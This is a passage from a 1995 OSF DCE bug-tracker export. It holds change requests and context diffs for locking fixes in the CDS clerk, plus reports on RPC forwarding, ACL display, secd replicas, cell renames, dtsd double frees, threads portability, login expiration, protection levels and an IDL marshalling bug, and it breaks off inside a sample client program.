>        	      /* 
>        	       * Save the opaque and internal login context in the link structure,
>        	       * Save the opaque login context in the 'user_t' field of thread_t,
>      ***************
>      *** 951,960 ****
>      --- 953,969 ----
>        	       * for convience.
>        	       * Precede the context with its length.
>        	       * This will we used for hashing the cache.
>        	       */
>        
>      +               if ((thstatus = dthread_lock(&(th_p->link_p->ll_mutex))) < 0)
>      +               {
>      +                   dce_svc_printf(CDS_S_PTHREADMUTEXLOCK_A_MSG, (long)thstatus);
>      +               }
>      + 
>      +               /* Beginning of the 'protected code' */
>      + 
>        	      /*
>        	       * if had one from before - see if it changed 
>        	       */
>        	      if (th_p->link_p->ll_opq_login_context) { 
>        		  if (EQ_bytes(th_p->link_p->ll_opq_login_context + 
>      ***************
>      *** 972,987 ****
>        
>        		    /* free it and get newer one*/
>        		    if (th_p->link_p->ll_opq_login_context)
>        			dns_free ((char *)th_p->link_p->ll_opq_login_context); 
>        		    /* release all cached binding handles */
>      ! 		    while ((cache_p = 
>      ! 			   (handle_cache_t *)th_p->link_p->ll_binding_hdr.next_p) !=
>      ! 			   (handle_cache_t *)&th_p->link_p->ll_binding_hdr) 
>      ! 			free_inuse_cached_handle (th_p, cache_p);
>        		  }
>        	      }
>        	      if (!done) {
>        		  p = th_p->link_p->ll_opq_login_context =
>        		    (byte_t *)dns_malloc((int)(length+sizeof(field16)));
>        
>        		  /*
>      --- 981,1001 ----
>        
>        		    /* free it and get newer one*/
>        		    if (th_p->link_p->ll_opq_login_context)
>        			dns_free ((char *)th_p->link_p->ll_opq_login_context); 
>        		    /* release all cached binding handles */
>      ! 		    for (cache_p = 
>      ! 			 (handle_cache_t *)th_p->link_p->ll_binding_hdr.next_p;
>      !                          cache_p !=
>      ! 			   (handle_cache_t *)&th_p->link_p->ll_binding_hdr;
>      !                          cache_p = next_p) {
>      !                             next_p = cache_p->hdr.next_p;
>      !                             free_inuse_cached_handle (th_p, cache_p);
>      !                       }
>        		  }
>        	      }
>      + 
>        	      if (!done) {
>        		  p = th_p->link_p->ll_opq_login_context =
>        		    (byte_t *)dns_malloc((int)(length+sizeof(field16)));
>        
>        		  /*
>      ***************
>      *** 989,998 ****
>      --- 1003,1018 ----
>        		   */
>        		  PUT16 (p, length);
>        		  COPY_bytes (reqPtr, p, length);
>        	      }
>        	      reqPtr += length;
>      + 
>      +               /* End of the 'protected code' */
>      +               if ((thstatus = dthread_unlock(&(th_p->link_p->ll_mutex))) < 0)
>      +               {
>      +                   dce_svc_printf(CDS_S_PTHREADMUTEXUNLOCK_A_MSG, (long)thstatus);
>      +               }
>        
>        #endif	/* defined(DCE_SEC) */
>        
>        	  }
>        	  length = GET16(reqPtr); /* arg 1 length */

The suggested fix for clerk_bind.c is:

>      *** /tmp/ci.10024..clerk_bind.c.10090.1	Fri Jan 27 16:30:54 1995
>      --- /tmp/clerk_bind.c.10090.2	Fri Jan 27 16:30:54 1995
>      ***************
>      *** 880,890 ****
>            return((handle_cache_t *)NULL);
>        }  
>        
>        
>        /*
>      !  * A cached handle is not longer useful.  Free it and its resources.
>         */
>        void 
>        free_cached_handle (thread_t              *th_p,
>                            rpc_binding_handle_t  handle)
>        {
>      --- 880,890 ----
>            return((handle_cache_t *)NULL);
>        }  
>        
>        
>        /*
>      !  * A cached handle is no longer useful.  Free it and its resources.
>         */
>        void 
>        free_cached_handle (thread_t              *th_p,
>                            rpc_binding_handle_t  handle)
>        {
>      ***************
>      *** 942,969 ****
>         */
>        void 
>        free_inuse_cached_handle (thread_t        *th_p,
>                                  handle_cache_t  *cache_p)
>        {
>      -     int thstatus;
>      - 
>        
>            DCE_SVC_DEBUG((
>                cds__svc_handle,
>                cds_svc_child,
>                svc_c_debug8,
>                " >free_inuse_cached_handle()"));
>        
>      !     if ((thstatus = dthread_lock(&(th_p->link_p->ll_mutex))) < 0)
>      !     {
>      !         dce_svc_printf(CDS_S_PTHREADMUTEXLOCK_A_MSG, (long)thstatus);
>      !     }
>      ! 
>      ! 
>      !      /* Beginning of the 'protected code' */
>      ! 
>      !     if(cache_p)
>            {
>        	/*
>        	 * If there are no other users of this handle, free it now     
>        	 */
>        	if (cache_p->usecount == 0)
>      --- 942,959 ----
>         */
>        void 
>        free_inuse_cached_handle (thread_t        *th_p,
>                                  handle_cache_t  *cache_p)
>        {
>        
>            DCE_SVC_DEBUG((
>                cds__svc_handle,
>                cds_svc_child,
>                svc_c_debug8,
>                " >free_inuse_cached_handle()"));
>        
>      !     if (cache_p)
>            {
>        	/*
>        	 * If there are no other users of this handle, free it now     
>        	 */
>        	if (cache_p->usecount == 0)
>      ***************
>      *** 977,993 ****
>        	     */
>        	    ++cache_p->killit;
>        	}
>            }
>        
>      - 
>      -     /* End of the 'protected code' */
>      -     if ((thstatus = dthread_unlock(&(th_p->link_p->ll_mutex))) < 0)
>      -     {
>      - 	dce_svc_printf(CDS_S_PTHREADMUTEXUNLOCK_A_MSG, (long)thstatus);
>      -     }
>      -       
>            DCE_SVC_DEBUG((
>                cds__svc_handle,
>                cds_svc_child,
>                svc_c_debug8,
>                " <free_inuse_cached_handle()"));
>      --- 967,976 ----

This should be followed by this subsequent patch to clerk_bind.c:

>      *** /tmp/ci.14731..clerk_bind.c.14765.1	Wed Feb  1 11:10:21 1995
>      --- /tmp/clerk_bind.c.14765.2	Wed Feb  1 11:10:21 1995
>      ***************
>      *** 22,31 ****
>      --- 22,36 ----
>         * All Rights Reserved
>        */
>        /*
>         * HISTORY
>         * $Log:	c012878,v $
# Revision 1.3  95/06/06  14:21:59  root
# changed fields:  new/changed/deleted note(s) [farrell 5/23/95 public] [farrell 6/6/95 public] [farrell 5/23/95 public]
# 
# Revision 1.2  95/05/23  11:11:57  root
# changed fields:  new/changed/deleted note(s) [farrell 5/23/95 public]
# 
# Revision 1.1  95/05/18  17:04:37  root
# new CR
# 
>      +  * Revision 7.3  1995/02/01  16:10:20  wright
>      +  * Reason:  OSDqa10524 cdsclerk improper locking can leave dangling pointers
>      +  * Removes locking to caller.  The rest of this change is included as
>      +  * part of the checkin to OSDqa10533.
>      +  *
>         * Revision 7.2  1993/08/31  22:14:28  wright
>         * Incorporate 1.0.3 bug fix (misbracketed if statement).
>         *
>         * Revision 1.1.9.2  1993/07/29  18:16:55  jd
>         * 	FIxed mis-bracketed if statement.
>      ***************
>      *** 582,604 ****
>            unsigned32     rpcStatus;
>        
>            DEBUG_EVENT(enter_free_inuse_cached_handle, 
>        		(" >free_inuse_cached_handle()\n"));
>        
>      -     CLERK_LOCK(th_p->link_p->ll_mutex)
>      - 
>            if (cache_p) {
>        	/* If there are no other users of this handle, free it now */
>        	if (cache_p->usecount == 0)
>        	  delete_cache_handle(th_p->link_p, cache_p); 
>        	else
>        	/* Otherwise, mark it to be deleted when no longer in use */
>        	  ++cache_p->killit;
>            }
>        
>      -     CLERK_END_LOCK(th_p->link_p->ll_mutex);
>      -       
>            DEBUG_EVENT(exit_free_inuse_cached_handle, 
>        		(" <free_inuse_cached_handle()\n"));
>        }
>        /*
>         * Decrement cached handle use count
>      --- 587,605 ----

[5/23/95 public]

Paul Smythe at HP brought this problem to my attention, but the fix
we arrived at together differs slightly from the above.  In order to 
also protect another thread from using the login context as it's 
being changed, we make a private copy of the login context for each 
thread using it.   

Here are our differences relative to the original r1.1 code.  HP is
still testing the fix.


> diff clerk_bind.c $bsrc/
456,464d455
< /*
<  *  *rpc_status_p =
<  *    do_sec_login(th_p->link_p->ll_opq_login_context+sizeof(field16),
<  *               EXT16(th_p->link_p->ll_opq_login_context),
<  *               &th_p->login_context);
<  */
<     *rpc_status_p =  do_sec_login(th_p->user+sizeof(field16),
<                                 EXT16(th_p->user),
<                                 &th_p->login_context);
465a457,460
>     *rpc_status_p =
>       do_sec_login(th_p->link_p->ll_opq_login_context+sizeof(field16),
>                  EXT16(th_p->link_p->ll_opq_login_context),
>                  &th_p->login_context);
>


> diff clerk_client.c $bsrc/
665d664
<
813d811
<       if (th_p->user) dns_free((char *)th_p->user);
908d905
<     int thstatus;
929,937d925
< #if defined(DCE_SEC)
<     /* Take mutex to protect the th_p->link_p->ll_opq_login_context */
<     if ((thstatus = dthread_lock(&(th_p->link_p->ll_mutex))) < 0)
<       {
<         dce_svc_printf(CDS_S_PTHREADMUTEXLOCK_A_MSG,
<                        (long)thstatus);
<       }
< #endif
<
949,951c937,938
<              * Save the opaque and internal login context in
<              * the link structure.  Save the opaque login
<              * context in the 'user_t' field of thread_t,
---
>              * Save the opaque and internal login context in the link structure,
>              * Save the opaque login context in the 'user_t' field of thread_t,
966d952
<
983d968
<
996d980
<
1021,1032d1004
< /*
<     th_p->user = th_p->link_p->ll_opq_login_context;
< */
<
<     if (th_p->link_p->ll_opq_login_context) {
<      register int length = EXT16(th_p->link_p->ll_opq_login_context);
<      if (th_p->user != NULL)
<        dns_free(th_p->user);
<      p = th_p->user = (byte *)dns_malloc((int)(length+sizeof(field16)));
<      PUT16(p, length);
<      COPY_bytes(th_p->link_p->ll_opq_login_context+sizeof(field16),p,length);
<     }
1034,1037c1006
<     if ((thstatus = dthread_unlock(&(th_p->link_p->ll_mutex))) <0) {
<       dce_svc_printf(CDS_S_PTHREADMUTEXUNLOCK_A_MSG,
<                      (long)thstatus);
<     }
---
>     th_p->user = th_p->link_p->ll_opq_login_context;

[6/6/95 public]
The fix I suggested above provides protection against both the case
where two threads try to update the login context at the same time,
and the case where one thread updates it while another reads it.

IMPORTANT: I did, however, miss one important edit without which
the clerk will deadlock.  The calls to lock and unlock the ll_mutex 
in the link structure within the free_inuse_cached_handle() procedure 
must be removed.  This procedure is found in clerk_bind.c.  Apologies for
the oversight.
 
HISTORY Thu May 18 17:04:35 1995 jcarroll	Created



CR Number                     : 12873
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime/dg
Short Description             : DG forwarding code needs to be revised
Reported Date                 : 5/17/95
Found in Baseline             : 1.1
Found Date                    : 5/17/95
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/17/95 public]

Currently, DG forwarding code is implemented with the assumption that the
forwarder server won't support its own services, except ept and mgmt IFs.
dced broke that assumption and it's erroneously in-line forwarding rdacl
requests with unknown object UUIDs (not registered in EP map). DG
forwarding code needs to be revised.

[05/18/95 public]
We thought we fixed this by having dced maintain a single object
uuid.

[5/18/95 public]

We thought, but we didn't. The forwarder server's single object uuid can
tell whether an incoming request with a non nil object uuid is for the
forwarder server or not. However, if an endpoint is not registered for that
ifspec/object uuid, dced returns rpc_e_fwd_drop and DG runtime tries to
handle it by itself because the ifspec is registerd, as shown in CR#12874.
If dced has returned ept_s_not_registered (because of dced's ifspec, but
the mismatched object uuid), DG runtime still handle it by itself. So, dced
must return rpc_e_fwd_reject in this case (which is the fix for CR#12874).
fwd_reject() has never used before, and its reject status is ugly. I think
that rpc__dg_fwd_pkt() should do better job with ept_s_not_registered.
Anyway, that's why we need to revisit DG forwarding code.

[05/18/95 public]
That makes sense.  Thanks for the explanation.

[2/5/96 public]

Downgraded and changed to the enhancement request because dce1.2.1 dced has
the workaround.



CR Number                     : 12871
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cds
Short Description             : cds object ACLs display misleading
Reported Date                 : 5/17/95
Found in Baseline             : 1.1
Found Date                    : 5/17/95
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/17/95 public]
Prior to 1.1, CDS directories sported rwdtcia rights ... and CDS
objects sported rwdtc rights.

With a 1.1 CDS clearinghouse, all CDS objects now seem to support
the full rwdtcia rights.

  An "acl_edit -e /.:/sec -l" on 1.0.3a shows stuff similar to:

     user:cell_admin:rwdtc

  while on 1.1 it shows:

     user:cell_admin:rwdtc--

The same results are visible through dcecp (acl show ...) depending
on whether it is pointed at a 1.0.3 CDS server or a 1.1 one.

While perhaps not a big deal in itself, we have scripts that are
parsing this dcecp output and will need to be changed for 1.1
unless this is "fixed".

[5/17/95 public]
This is a bug in the display of the ACLs only.  Functionality is 
the same as in 1.0.3.  Object entries support only "rwdtc" rights.



CR Number                     : 12866
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : secd
Short Description             : replicas leave stale CDS info
after graceful shutdown
Reported Date                 : 5/12/95
Found in Baseline             : 1.1wp
Found Date                    : 5/12/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/12/95 public]

Replicas currently leave themselves registered in the cds
namespace after they're gracefully shut down; thus they can still be
offered for client binding, which entails long timeouts, and causes
seemingly random failures in sec_rgy_site_bind_update().

This is not a warranty patch problem per se, but when security
servers are migrated forward to full 1.1, any "true" 1.0.3
replicas get are told by the 1.1 master to shut down.  In so 
doing, those replicas leave stale bindings in the CDS namespace.
This causes, among other things, spurious failures in security
functional tests, many of which call sec_rgy_site_bind_update().

[5/12/95 public]

I neglected to mention that the workaround for this
problem is to (1) remove the server entry for the 
dead server from the namespace and (2) remove the
server link to that server entry from the /.:/sec
group in the namespace.  Or you could migrate the
server in question to 1.1 in the usual fashion
(see the warranty patch release notes for such a
fashion statement).



CR Number                     : 12864
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : cellalias
Short Description             : cell renames don't work reliably
Reported Date                 : 5/12/95
Found in Baseline             : 1.1wp
Found Date                    : 5/08/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/12/95 public]

*NOTE* "found in baseline" above should be "1.1 warrantee patch".

`cellalias set' correctly changes the primary name of the cell on all
systems within the cell, but after that change, some residues of the old
name linger on, and that lingering residue causes problems.

We have observed several failures after a cell rename which we haven't yet
had time to characterize; for instance, binding to a read-write replica
after contacting a read-only replica.

The most likely cause of this *within secd* is the use of the cell property
containing the "original" cell name as the "primary" cell name.  The
original is used in a half dozen places throughout secd, and perhaps half
of them should be using dce_cf_get_cell_name() instead.

There are also likely residues of the old cell name within CDS as well.

We tried to fix these, but they won't make the warrantee patch, so 
"cellalias set" will be disabled in the WP.

[6/8/95 public]

Could this be the cause of problems described in OT 12908?

[7/13/95 public]

Please add the comments at the end of the OT's "full description" with
appropriate tag "[your_name date public]" etc..... I have relocated the
following text as it was inserted at the wrong place:

-------BEGIN--------
This is a note from one of our developers []: 
  The 'cellalias set' function was to provide all function required to set an
  existing cell alias name to be the primary cell name, and in turn move the
  existing primary cell name to become an alias name.  This function is above
  that provided by 'cdsalias set' in that it 'notifies security'.  The 'cdsalias
  set' command specifically states that prior to its use, the CDS and Security
  servers, as well as each host in the cell, must know about the alias.  I am
  not 100% clear of how the required function is allocated between the
 'cellalias
  create', 'cdsalias set', and that which was to be available in 'cellalias
 set',
  but it does appear that in the current TCL script for 'cellalias set', there
 is
  some principal data modified, and then a 'registry verify' is performed which
  should updated all security replicas.  In viewing the existing OT defect on
  'cellalias set' it makes reference to some embedded security names not
 becoming
  updated properly.  Hence it is assumed that some problem with security is what
  has us lacking the function to be provided by 'cellalias set'.
  We require the means to take an existing cell and configure it into a hierar-
  chy.  We are not guaranteed that our customers will configure hierarchies
 based
  on strictly newly configured cells.  Hence we cannot assume that our configu-
  ration steps telling the customer to provide a cell name which is the ultimate
  primary name for the cell as it will exist in the hierarchy is satisfactory
  for an H-Cell product delivery.  Whatever is required to take an arbitrary
  existing cell and smoothly configure it into a hierarchy is the functionality
  we require.  In the readings on the H-Cells, it appears that the 'cellalias
  set' function was pivotal to this desired functionality.
-------END--------

[01/22/96 public]
This has been changed to an enhancement rather than a defect the
PM team has agreed to this change.



CR Number                     : 12861
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 12862
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dts
Subcomponent Name             : dtsd
Short Description             : dtsd frees memory that the rpc runtime has already free'd.
Reported Date                 : 5/4/95
Found in Baseline             : 1.1
Found Date                    : 5/04/95
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : dtss_service_global_set.c
Sensitivity                   : public

[5/10/95 public]

In dtss_service_global_set.c, when the dts server is unable to call 
rpc_mgmt_inq_server_princ_name(), it free's the variable serverPrincName.
The rpc runtime already does this if the call fails.  This is undocumented
in the rpc_mgmt_inq_server_princ_name() manpage.

Repeat By:

        Run dtsd in 'bad' conditions so rpc_mgmt_inq_server_princ_name fails
and notice a bad free.

Proposed Solution:

The rpc_mgmt_inq_server_princ_name() man page should document the
fact that the server_pric_name argument does not need to be free'd
if an error occurrs.

Code in src/time/service/dtss_service_global_set.c should be changed:

*** /animal/build/dce1.1/src/time/service//dtss_service_global_set.c	Tue Dec 13 11:24:05 1994
--- dtss_service_global_set.c	Thu May  4 15:04:50 1995
***************
*** 8,20 ****
  /*
   * HISTORY
   * $Log:	c012861,v $
# Revision 1.2  95/05/10  11:36:52  root
# changed fields: Inter-dependent CRs  
# 
# Revision 1.1  95/05/10  11:25:21  root
# new CR
# 
!  * Revision 2.1  1994/12/13  16:21:37  devrcs
!  * OSF DCE 1.1 Source
   *
   * Revision 1.1.4.7  1994/08/23  20:32:26  cbrooks
   * 	Code Cleanup Checkpoint
   * 	[1994/08/23  13:57:02  cbrooks]
!  *
   * Revision 1.1.4.6  1994/08/05  20:47:40  cbrooks
   * 	CR11240 - add dced config functionality
   * 	[1994/08/05  20:23:39  cbrooks]
--- 8,24 ----
  /*
   * HISTORY
   * $Log:	c012861,v $
# Revision 1.2  95/05/10  11:36:52  root
# changed fields: Inter-dependent CRs  
# 
# Revision 1.1  95/05/10  11:25:21  root
# new CR
# 
!  * Revision 2.1.1.2  1995/05/04  19:04:46  tomj
!  * 	Don't free serverPrincName if inq_server_princ_name fails
!  * 	since the runtime does this for us.
   *
+  * Revision 2.1  1994/12/13  16:21:37  devrcs
+  * 	OSF DCE 1.1 Source
+  * 
   * Revision 1.1.4.7  1994/08/23  20:32:26  cbrooks
   * 	Code Cleanup Checkpoint
   * 	[1994/08/23  13:57:02  cbrooks]
!  * 
   * Revision 1.1.4.6  1994/08/05  20:47:40  cbrooks
   * 	CR11240 - add dced config functionality
   * 	[1994/08/05  20:23:39  cbrooks]
***************
*** 480,485 ****
--- 484,490 ----
  		dce_error_string_t tempstring;
  		dce_svc_printf(DTS_S_INQ_SERVER_PRINC_MSG, 
  			       dce_dts_error_text( rpcStatus, tempstring));
+ 		serverPrincName = NULL;		/* runtime frees on error */
  		goto DoNotAdd;
  	    }



CR Number                     : 12860
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : client, server
Short Description             : Portability of threads macros
Reported Date                 : 5/9/95
Found in Baseline             : 1.1
Found Date                    : 5/9/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : client/login/sec_login_pag.c, client/login/sec_login_pvt.c, client/login/sec_login_np.c, client/login/[AT386|HP800|PMAX|RIOS|SVR4]/sec_login_np.c, server/rs/rwl.c
Sensitivity                   : public

[5/9/95 public]

A support customer raised the following point about several threads
macros used within security:

> We suggest making a simple change to  several places in the security code
> to enhance portability to Posix Threads based implementations, without impact
> on CMA Threads based ones.
> 
> As one example, in security/server/rs/rwl.c, the PSEM/VSEM macros
> are coded in a manner which exposes a nefarious behavioral difference
> between CMA Threads and Pthreads, coming from their definitions of the
> primitive type pthread_mutex_t. Similar remarks apply to pthread_cond_t.
> 
> In CMA threads these types are defined, essentially, as references
> to the objects in question. In our version of
> Pthreads, these types ARE the objects.  Thus an assignment statement
> as in the aforementioned PSEM macro creates of copy of the object, rather
> than merely another reference to it.  Using a copy of a mutex does not
> create the required serialization.  As we read the Posix Pthreads spec.
> there is room for just this kind of divergence between implementations
> supporting the API.
> 
> If the OSF sources are modified so that objects of these primitive types
> are never seen on the left hand side of assignment statements, these
> differences will never occur.  Since we believe that, over time, more
> ports of DCE will use Posix Threads, we suggest making such modifications
> to enhance portability now (and alert submitters of new code to
> the issue).
> 
> In all, three cases of macros requiring mods have been identified and
> are found in:
>        security/server/rs/rwl.c
>        security/client/login/sec_login_pag.c and sec_login_pvt.c
> In all cases, the change is merely to define a pthread_mutex_t* as the
> automatic variable, rather than a pthread_mutex_t.

On further examination, use of similar macros was found in the various
sec_login_np.c files listed above.  Also, the suggested change will be
a bit more complicated in server/rs/rwl.c, where the macro involves a
struct containing a mutex and not just a pthread_mutex_t.



CR Number                     : 12859
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : sams
Short Description             : CDS.SAMS file and may be others reporting status code in incorrect format
Reported Date                 : 5/8/95
Found in Baseline             : 1.1
Found Date                    : 5/8/95
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/8/95 public]

Rich Salz reported:

The CDS.SAMS file uses %ld when it reports status codes.
This makes it hard to find them in the PDG.  STatus codes should
be reported as 0x%8.8lx and the value cast to a (long).

Other sams files probably have the same bugs.



CR Number                     : 12858
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : sec_login
Short Description             : context expiration incorrect
Reported Date                 : 5/4/95
Found in Baseline             : 1.1
Found Date                    : 5/4/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/4/95 public]
sec_login_get_expiration extracts the expiration from the in-memory copy
of a login-context.  If it's called to inquire about the default
context, this means that it may not return the correct expiration time,
if the context has been refreshed by another process.

[5/12/95 public]

Following is customer reported problem that I believe is yet another symptom of
this problem:

on command line:
---------------
dce_login <princ> <princ_passwd>

sometime later:
--------------
I want to run a utility within the context of the earlier shell that will
extend my expiration time.

For this I could use kinit, but cant because kinit does some funny things
with the tty to read the passwd. Hence I am trying to use a very simple program

The program takes as an argument the passwd for the currently logged in context.

The steps are:
-------------
get the login context

refresh the context using 
sec_login_refresh_identity (inherited context,  status)

If the status is okay, and now it is, then

sec_login_validate_identity(lc, ....) using the passwd string.

I set the current login context after validating. But this step is noise
because there is no difference whether I set the context or not.

Now when I run this program, I have no problem at all. There are no errors.
When I exit the program, and run klist I see no change in the expiration time
for the  krbtgt, or the ticket granting ticket.

But If I do this process using kinit, I can see the change in the krbtgt time.



CR Number                     : 12857
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 9549
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : protection level being modified by rpc__krb_bnd_set_auth
Reported Date                 : 
Found in Baseline             : 1.1
Found Date                    : 
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : src/rpc/runtime/krbclt.c
Sensitivity                   : public

[4/6/95 public]

For some reason, in 1.1 code was added to rpc__krb_bnd_set_auth to change
the protection level on a binding handle.  For CN, call is upgraded to packet,
and for DG, connect and call are upgraded to packet.  For one thing, this is
unnecessary, since everywhere in the code where the levels are checked, the
upgrading is done by the code.

It is also incorrect.  Connect level protection is different from call level
protection.

This also is causing the auth_info cache to miss, since the cache check is done
by rpc_binding_set_auth_info before callling rpc__krb_bnd_set_auth, so it's
looking for the original level, but the new auth_info is cached using the
modified level, so only the upgraded level is ever in the cache.

This also would cause servers to see the wrong level from rpc_binding_inq_auth_client.

I don't see any evidence that the change was made in response to a problem (no
OT mentioned in the change records for krbclt.c)  I think the following refers
to this change:

 * Revision 1.1.913.2  1994/08/15  19:04:53  ganni
 *      protection level need to be upgraded to the next higher
 *      supported level, if the given level is not supported.
 *      [1994/08/15  19:01:52  ganni]

[5/4/95 public]

See CR#9549. This makes the implementaion AES compliant. Unfortunately, you
are right about the cache miss. rpc__auth_info_cache_lkup() need to be
fixed. (Probably, we need another operation to inquire the supported
authn_levels?)

[5/8/95 public]
This is still incorrect.  Connect level should not be upgraded to packet
level.  The AES - and the code - define different behavior for these two
levels.

It is also being done in the wrong place.  It should not be done late in
the game by rpc__krb_bnd_set_auth, but should be done up front by
rpc_binding_set_auth_info or a routine it calls.  Then the call to
rpc__auth_info_cache_lkup would not fail, and performance would not
suffer they way it has.

[5/8/95 public]

Why shouldn't the connect level be upgraded to the packet level? AES allows
the implementation to do that. (Of course, the semantics of these two
levels are different.)

As I said in my earlier comment, we will need a new operation in auth EPV
to inquire the supported protection levels for upgrading a level before
calling rpc__auth_info_cache_lkup() because the different authentication
service/protseq combinations have different mapping.

[2/5/96 public]

I'm downgrading this because functionally it still operates correctly.
Cache miss should be fixed later (probably while working on the public
key).



CR Number                     : 12856
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl
Short Description             : Aliased full pointers to variable length arrays use the first length encountered.
Reported Date                 : 5/3/95
Found in Baseline             : 1.1
Found Date                    : 5/3/95
Severity                      : A
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : andi
Transarc Status               : 

[5/3/95 public]

Problems in:
        Marshalling interpreter.
 
Synopsis:
        Aliased full pointers to variable length arrays use the first length
        encountered.
 
Description:
        If a full pointer to an array is passed to an RPC multiple
        times, using different values for the "size_is()" parameter
        each time, the IDL marshaller may not transmit enough of the
        array.
 
        In the following example, a pointer to the same array of
        strings is passed as both arguments to the send_strings RPC.
        The first time the array is specified to contain 1 element,
        the second time 2.  The runtime marshalls a node for the array
        the first time it's encountered, and marshalls an array of
        length 1.  The second time it ignores the size_is parameter.
        The manager routine, trusting the second size_is, indirects
        through the nonexistant second element of the array and
        coredumps or gets a wrong result.
 
        This example is contrived, of course, and its easy to say that
        "you shouldn't do that".  The customer code where we
        first saw this problem is much more reasonable.
 
        Its arguable whether the runtime should be smart enough to
        lengthen the array when it sees it the second time.   Perhaps
        it would be enough just to raise an exception when an existing
        node is referenced with a different length than the previous
        reference.  But given that the Application Development Guide
        explicitly says you can do aliasing, the current silent error
        or coredump doesn't seem like the right answer.
 
 
Example program:
---------- bill_rqs.idl -----------
/*
 * test idl
 *
 * Copyright (C) 1995 Transarc Corporation - All rights reserved.
 *
 * HISTORY
 *  20-Apr-95  Daniel Nydick (nydick@transarc.com)
 *      Created.
 */
[
    uuid(92fe07cc-7b54-11ce-b127-9e620c39aa77),
    version(1.0)
]
interface bill_rqs
{
    typedef [ptr,string] char *string_t;
 
        /*
         * pass two arrays of strings
         */
    error_status_t send_strings(
                [in] handle_t h,
                [in,ptr,size_is(a1size)] string_t a1[],
                [in] long int a1size,
                [in,ptr,size_is(a2size)] string_t a2[],
                [in] long int a2size
        );
 
}
 
---------- client.c ----------------
/*
 * test client
 *
 * Copyright (C) 1995 Transarc Corporation - All rights reserved.
 *
 * HISTORY
 *  20-Apr-95  Daniel Nydick (nydick@transarc.com)
 *      Created.
 */
 
#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include <dlfcn.h>
#include <dce/pthread_exc.h>
#include <dce/rpc.h>
#include <dce/rpcexc.h>
#include <dce/sec_login.h>
#include <bill_rqs.h>
 
#define CKERR(why) if (st != error_status_ok) {\
        fprintf(stderr,"%s, err=%d\n",why,st); exit(1);}
 
/*
 * canonical usage message
 */
void usage(void)
{
    fprintf(stderr,"usage: client <string_binding>\n");
    exit(1);
}
 
/*
 * get an RPC handle.
 */
handle_t get_handle(const char *name)
{
    handle_t hndl;
    error_status_t st, dummy;
    sec_login_handle_t auth_identity;
    unsigned_char_t *server_princ;
 
    rpc_binding_from_string_binding((idl_char *)name, &hndl, &st);
    CKERR("rpc_binding_from_string_binding");
 
    return (hndl);
}
 
/*
 * make a call on the passed handle
 */
doit(handle_t h)
{
    string_t *strs;
    error_status_t st;
    int i;
 
    strs = malloc(2*sizeof(string_t));
 
    strs[0] = (idl_char *)"string 0";
    strs[1] = (idl_char *)"string 1";
 
    TRY {
        st = send_strings(h, strs, 1, strs, 2);
        if (st) fprintf(stderr,"send_strings returns failure: %d\n",st);
    } CATCH_ALL {
        fprintf(stderr,"Exception caught from send_strings 0x%x\n",THIS_CATCH);
        exit(1);
    } ENDTRY;
 
    free(strs);
}
 
main(int argc, char **argv)
{
